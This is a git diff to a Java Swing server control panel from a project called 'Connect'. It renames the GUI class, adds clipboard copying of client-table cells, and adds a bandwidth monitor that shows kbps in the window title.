@@ -1,9 +1,10 @@
-package br.com.introcdc.connect.server;
+package br.com.introcdc.connect.server.gui;
 /*
  * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 15:46
  */
 
 import br.com.introcdc.connect.Connect;
+import br.com.introcdc.connect.server.ConnectServer;
 import br.com.introcdc.connect.server.components.ServerAudioComponents;
 import br.com.introcdc.connect.server.components.ServerControlComponents;
 import br.com.introcdc.connect.server.components.ServerImageComponents;
@@ -14,6 +15,10 @@ import javax.swing.event.DocumentEvent;
 import javax.swing.event.DocumentListener;
 import javax.swing.table.DefaultTableModel;
 import java.awt.*;
+import java.awt.datatransfer.DataFlavor;
+import java.awt.datatransfer.StringSelection;
+import java.awt.datatransfer.Transferable;
+import java.awt.datatransfer.UnsupportedFlavorException;
 import java.awt.event.*;
 import java.awt.image.BufferedImage;
 import java.io.File;
@@ -21,7 +26,7 @@ import java.util.HashMap;
 import java.util.Map;
 import java.util.function.Function;
 
-public class ConnectServerGUI extends JFrame {
+public class ServerGUI extends JFrame {
 
     private static final long serialVersionUID = 1L;
 
@@ -59,6 +64,8 @@ public class ConnectServerGUI extends JFrame {
     public static JButton fpsButton;
     private final JButton folderButton;
     private final JButton clearButton;
+    private double download = 0;
+    private double upload = 0;
 
     // -- Para gerenciar a tabela de clientes
     private static DefaultTableModel clientTableModel;
@@ -74,14 +81,14 @@ public class ConnectServerGUI extends JFrame {
     private boolean autoCompleteEnabled = true;
 
     // Singleton
-    private static ConnectServerGUI instance;
+    private static ServerGUI instance;
 
-    public static ConnectServerGUI getInstance() {
+    public static ServerGUI getInstance() {
         return instance;
     }
 
-    public ConnectServerGUI() {
-        super("Painel do Servidor - 0 Clientes Conectados");
+    public ServerGUI() {
+        super("Painel do Servidor - 0 Clientes Conectados | Download: 0kbps - Upload: 0kbps");
 
         // =============== TENTAR APLICAR NIMBUS ===============
         try {
@@ -538,6 +545,26 @@ public class ConnectServerGUI extends JFrame {
             clientTable.setGridColor(Color.LIGHT_GRAY);
         }
 
+        clientTable.addMouseListener(new MouseAdapter() {
+            @Override
+            public void mouseClicked(MouseEvent event) {
+                int row = clientTable.rowAtPoint(event.getPoint());
+                int column = clientTable.columnAtPoint(event.getPoint());
+
+                if (row >= 0 && column >= 0) {
+                    Object cellValue = clientTable.getValueAt(row, column);
+
+                    if (cellValue instanceof String) {
+                        copyToClipboard((String) cellValue);
+                    } else if (cellValue instanceof ImageIcon) {
+                        ImageIcon icon = (ImageIcon) cellValue;
+                        copyImageToClipboard(icon.getImage());
+                    }
+                }
+            }
+        });
+
+
         JScrollPane tableScroll = new JScrollPane(clientTable);
         TitledBorder tableBorder = BorderFactory.createTitledBorder("Informações dos Clientes");
         tableScroll.setBorder(tableBorder);
@@ -598,6 +625,39 @@ public class ConnectServerGUI extends JFrame {
         pack();
         setLocationRelativeTo(null);
     }
+
+    private void copyToClipboard(String text) {
+        Toolkit.getDefaultToolkit()
+                .getSystemClipboard()
+                .setContents(new StringSelection(text), null);
+    }
+
+    private void copyImageToClipboard(Image image) {
+        Transferable transferable = new Transferable() {
+            @Override
+            public DataFlavor[] getTransferDataFlavors() {
+                return new DataFlavor[]{DataFlavor.imageFlavor};
+            }
+
+            @Override
+            public boolean isDataFlavorSupported(DataFlavor flavor) {
+                return DataFlavor.imageFlavor.equals(flavor);
+            }
+
+            @Override
+            public Object getTransferData(DataFlavor flavor) throws UnsupportedFlavorException {
+                if (isDataFlavorSupported(flavor)) {
+                    return image;
+                }
+                throw new UnsupportedFlavorException(flavor);
+            }
+        };
+
+        Toolkit.getDefaultToolkit()
+                .getSystemClipboard()
+                .setContents(transferable, null);
+    }
+
 
     public static JButton createButton(String text) {
         JButton button = new JButton(text);
@@ -696,7 +756,7 @@ public class ConnectServerGUI extends JFrame {
     // -------------------- Mostrar GUI (Singleton) --------------------
     public static void showGUI() {
         if (instance == null) {
-            instance = new ConnectServerGUI();
+            instance = new ServerGUI();
         }
         instance.setVisible(true);
     }
@@ -716,7 +776,7 @@ public class ConnectServerGUI extends JFrame {
             instance.clientCombo.addItem(clientId);
             int size = ConnectServer.CLIENTS.size();
             String plus = size == 1 ? "" : "s";
-            instance.setTitle("Painel do Servidor | " + ConnectServer.CLIENTS.size() + " Cliente" + plus + " Conectado" + plus);
+            instance.setTitle("Painel do Servidor | " + ConnectServer.CLIENTS.size() + " Cliente" + plus + " Conectado" + plus + " | Download: " + getInstance().download + "kbps - Upload: " + getInstance().upload + "kbps");
         }
     }
 
@@ -725,7 +785,7 @@ public class ConnectServerGUI extends JFrame {
             instance.clientCombo.removeItem(clientId);
             int size = ConnectServer.CLIENTS.size();
             String plus = size == 1 ? "" : "s";
-            instance.setTitle("Painel do Servidor | " + ConnectServer.CLIENTS.size() + " Cliente" + plus + " Conectado" + plus);
+            instance.setTitle("Painel do Servidor | " + ConnectServer.CLIENTS.size() + " Cliente" + plus + " Conectado" + plus + " | Download: " + getInstance().download + "kbps - Upload: " + getInstance().upload + "kbps");
         }
     }
 
@@ -930,6 +990,36 @@ public class ConnectServerGUI extends JFrame {
         return CONTROL_FRAME;
     }
 
+    public void monitorTraffic() {
+        long previousSent = 0;
+        long previousReceived = 0;
+
+        for (; ; ) {
+            try {
+                Thread.sleep(1000);
+
+                long currentSent = ConnectServer.BYTES_SENT.get();
+                long currentReceived = ConnectServer.BYTES_RECEIVED.get();
+
+                long sentRate = currentSent - previousSent; // Bytes enviados no intervalo
+                long receivedRate = currentReceived - previousReceived; // Bytes recebidos no intervalo
+
+                previousSent = currentSent;
+                previousReceived = currentReceived;
+
+                // Converte para Kbps
+                upload = ((sentRate * 8) / 1024.0);
+                download = ((receivedRate * 8) / 1024.0);
+
+                String plus = ConnectServer.CLIENTS.size() == 1 ? "" : "s";
+                instance.setTitle("Painel do Servidor | " + ConnectServer.CLIENTS.size() + " Cliente" + plus + " Conectado" + plus + " | Download: " + download + "kbps - Upload: " + upload + "kbps | " + System.currentTimeMillis());
+            } catch (InterruptedException exception) {
+                exception.printStackTrace();
+                break;
+            }
+        }
+    }
+
     public JFrame audioControlPanel() {
         try {
             UIManager.setLookAndFeel("javax.swing.plaf.nimbus.NimbusLookAndFeel");
@@ -1015,7 +1105,7 @@ public class ConnectServerGUI extends JFrame {
         if (DARK_MODE) {
             record.setForeground(Color.WHITE);
         }
-        gcButton.addActionListener(e -> ConnectServerGUI.sendDirectCommand("gc"));
+        gcButton.addActionListener(e -> ServerGUI.sendDirectCommand("gc"));
         panel.add(gcButton);
 
         AUDIO_CONTROL.setContentPane(panel);
